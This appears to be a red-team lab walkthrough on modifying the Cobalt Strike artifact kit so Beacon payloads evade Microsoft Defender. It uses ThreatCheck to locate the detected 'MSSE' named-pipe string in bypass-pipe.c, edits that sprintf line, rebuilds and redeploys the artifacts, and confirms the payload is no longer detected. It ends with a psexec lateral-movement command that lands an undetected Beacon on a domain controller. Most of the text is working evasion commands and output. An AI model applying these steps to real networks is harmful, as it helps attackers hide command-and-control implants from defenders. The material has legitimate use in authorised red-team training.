The artifact kit produces "placeholder" binaries that contain all the logic for executing a Beacon, but without the actual Beacon payload inside. When a payload is generated from the Cobalt Strike UI, it takes one of these artifact files and patches it on-the-fly with Beacon shellcode. When executed, the artifact will load and run that shellcode.

Most artifacts will inject into themselves using VirtualAlloc/VirtualProtect/CreateThread. The service binary is the only one that performs remote injection.

Changing existing, or creating new templates, allows you to change how that shellcode is actually executed, and subsequently bypass AV signatures and/or behavioural analysis.

Before we start messing with changing the payload template, we need an idea of which part(s) Defender is detecting as malicious.  [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) takes an input file which it splits into parts, then scans each part to try and find the smallest component that triggers a positive detection.

Generate a Windows Service EXE and save it to `C:\Payloads`, then scan it with ThreatCheck.

```
C:\>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc.exe
[+] Target file size: 289280 bytes
[+] Analyzing...

[...snip...]

[!] Identified end of bad bytes at offset 0x44E70
00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000010   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000090   5F 73 65 74 5F 69 6E 76  61 6C 69 64 5F 70 61 72   _set_invalid_par
000000A0   61 6D 65 74 65 72 5F 68  61 6E 64 6C 65 72 00 00   ameter_handler··
000000B0   77 69 6E 64 69 72 00 25  73 5C 53 79 73 74 65 6D   windir·%s\System
000000C0   33 32 5C 25 73 00 72 75  6E 64 6C 6C 33 32 2E 65   32\%s·rundll32.e
000000D0   78 65 00 00 00 00 00 00  00 00 00 00 00 00 00 00   xe··············
000000E0   25 63 25 63 25 63 25 63  25 63 25 63 25 63 25 63   %c%c%c%c%c%c%c%c
000000F0   25 63 4D 53 53 45 2D 25  64 2D 73 65 72 76 65 72   %cMSSE-%d-server

[*] Run time: 8.91s
```

ThreatCheck attempts to find the end of the "bad bytes" and produces a hex dump up from that point. So the content closest to the end is what we want to focus on. It looks like the detection is coming from the string `%c%c%c%c%c%c%c%c%cMSSE-%d-server`, which is a good starting point.

Searching for where **MSSE** appears in the kit, we find it's in `bypass-pipe.c`.

```
root@kali:/opt/cobaltstrike/artifact-kit# grep -r MSSE
src-common/bypass-pipe.c:       sprintf(pipename, "%c%c%c%c%c%c%c%c%cMSSE-%d-server", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

>  `bypass-pipe` is not the default set of artifacts that Cobalt Strike uses, `bypass-readfile` is. I've preconfigured CS to use `bypass-pipe`, because modifying this portion of the source code is easier to follow and understand.

The `dist-pipe` artifact will create a named pipe, read the shellcode over that pipe, and then executes it.

This line attempts to generate a pseudo-random pipe name. It seems as though it's already semi-obfuscated because of the slightly weird formatting. It produces a string that would look something like: `\\.\pipe\MSSE-1866-server`, where `1866` is from `GetTickCount` (which is the number of milliseconds elapsed since the computer started).

I'm an advocate of the **KISS** principle (**k**eep **i**t **s**imple, **s**tupid), so let's just change the strings **MSSE** and **server** to something different, such as:

```
sprintf(pipename, "%c%c%c%c%c%c%c%c%cRasta-%d-pipe", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

  

To build these changes, run the `build.sh` script.

```
root@kali:/opt/cobaltstrike/artifact-kit# ./build.sh
```

  

Within the `dist-pipe` directory you'll see a new list of artifacts that have been built, along with an `artifact.cna` file. The CNA file contains some Aggressor that tells Cobalt Strike to use these artifacts inside of the default ones.

```
root@kali:/opt/cobaltstrike/artifact-kit# ls -l dist-pipe/
total 2108
-rwxr-xr-x 1 root root 312334 Mar 17 09:25 artifact32big.dll
-rwxr-xr-x 1 root root 310286 Mar 17 09:25 artifact32big.exe
-rwxr-xr-x 1 root root  41998 Mar 17 09:25 artifact32.dll
-rwxr-xr-x 1 root root  39950 Mar 17 09:25 artifact32.exe
-rwxr-xr-x 1 root root 311822 Mar 17 09:25 artifact32svcbig.exe
-rwxr-xr-x 1 root root  41486 Mar 17 09:25 artifact32svc.exe
-rwxr-xr-x 1 root root 311808 Mar 17 09:26 artifact64big.exe
-rwxr-xr-x 1 root root 312320 Mar 17 09:26 artifact64big.x64.dll
-rwxr-xr-x 1 root root  41472 Mar 17 09:26 artifact64.exe
-rwxr-xr-x 1 root root 313344 Mar 17 09:26 artifact64svcbig.exe
-rwxr-xr-x 1 root root  43008 Mar 17 09:26 artifact64svc.exe
-rwxr-xr-x 1 root root  41984 Mar 17 09:25 artifact64.x64.dll
-rw-r--r-- 1 root root   2031 Mar 17 09:25 artifact.cna
```

Copy the whole `dist-pipe` directory to `C:\Tools\cobaltstrike\ArtifactKit`.

```
C:\Tools\cobaltstrike>pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
artifact32big.exe         | 303 kB | 303.0 kB/s | ETA: 00:00:00 | 100%
artifact64svcbig.exe      | 306 kB | 306.0 kB/s | ETA: 00:00:00 | 100%
artifact32svcbig.exe      | 304 kB | 304.5 kB/s | ETA: 00:00:00 | 100%
artifact64big.exe         | 304 kB | 304.5 kB/s | ETA: 00:00:00 | 100%
artifact64.exe            | 40 kB |  40.5 kB/s | ETA: 00:00:00 | 100%
artifact64.x64.dll        | 41 kB |  41.0 kB/s | ETA: 00:00:00 | 100%
artifact.cna              | 1 kB |   2.0 kB/s | ETA: 00:00:00 | 100%
artifact32svc.exe         | 40 kB |  40.5 kB/s | ETA: 00:00:00 | 100%
artifact32.exe            | 39 kB |  39.0 kB/s | ETA: 00:00:00 | 100%
artifact64svc.exe         | 42 kB |  42.0 kB/s | ETA: 00:00:00 | 100%
artifact32.dll            | 41 kB |  41.0 kB/s | ETA: 00:00:00 | 100%
artifact64big.x64.dll     | 305 kB | 305.0 kB/s | ETA: 00:00:00 | 100%
artifact32big.dll         | 305 kB | 305.0 kB/s | ETA: 00:00:00 | 100%
```
  
In Cobalt Strike, go to **Cobalt Strike > Script Manager** and you'll see that this is already loaded (as mentioned previously). There's no need to load it again, but just know this is where you can load/reload CNA files.

To test the new templates, generate the same service EXE payload as before and scan it with ThreatCheck.

Lo and behold…

```
C:\Tools>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc-dist-pipe.exe
[+] No threat found!
[*] Run time: 0.89s
```

Now when we try to jump to `dc-2`, the payload is not detected by AV and we get a Beacon.

```
beacon> jump psexec64 dc-2 smb
Started service c1d61c7 on dc-2
[+] established link to child beacon: 10.10.17.71
```
